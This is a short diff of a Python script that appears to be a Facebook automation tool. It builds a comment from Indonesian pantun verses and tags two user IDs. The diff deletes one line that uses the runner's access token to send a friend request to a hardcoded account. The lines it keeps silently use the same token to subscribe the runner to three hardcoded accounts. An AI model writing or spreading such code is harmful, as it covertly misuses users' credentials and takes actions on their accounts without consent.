@@ -98,7 +98,6 @@ def __menu__():
                 pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
                 kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
                 komen3 = kata_utama3+"\n"+pantun_motivasi
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
                 requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
                 requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
                 requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
